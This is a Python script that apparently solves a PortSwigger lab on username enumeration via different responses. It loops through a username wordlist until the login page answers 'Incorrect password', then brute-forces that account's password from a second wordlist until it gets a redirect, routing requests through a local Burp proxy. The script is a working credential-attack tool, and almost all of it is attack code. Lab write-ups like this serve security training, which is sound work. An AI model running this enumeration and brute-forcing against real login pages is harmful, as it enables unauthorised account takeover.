import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def print_lab_info(url):
    info = f"""
+{'='*70}+

 PortSwigger Lab: Authentication vulnerabilities
 Challenge: Username enumeration via different responses
 Target: {url}

 This lab is vulnerable to username enumeration and password brute-force attacks. 
 It has an account with a predictable username and password, which can be found in the following wordlists:

 - Candidate usernames
 - Candidate passwords

 To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

+{'='*70}+
"""
    print(info)
    
def exploit_username_enumeration_via_different_responses(url) :
    session = requests.session()
    with open("./list/username.txt") as u_file, open("./list/password.txt") as p_file:
        users = [u.strip() for u in u_file]
        passwords = [p.strip() for p in p_file]
        
    login_url = url + "/login"
    
    valid_username = None
    
    for user in users :
        login_data = {"username" : user, "password" : "123456"}
            
        response = session.post(login_url, data=login_data, verify=False, allow_redirects=False, proxies=proxies)
        
        if "Incorrect password" in response.text :
            print(f"valid username : {user}")
            valid_username = user
            break
    
    if not valid_username:
        print("[-] Not Found username")
        return
    
    for password in passwords :
        login_data = {"username" : valid_username, "password" : password}
        
        response = session.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)
        
        if response.status_code == 302:
            print(f"[🎉] Exploit Success => username: {valid_username}, password: {password}")
            return
        
    print("[🧨] Exploit Failed")
        

def main() :
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
    
    url = sys.argv[1]
    print_lab_info(url)
    exploit_username_enumeration_via_different_responses(url)
    
if __name__ == "__main__":
    main()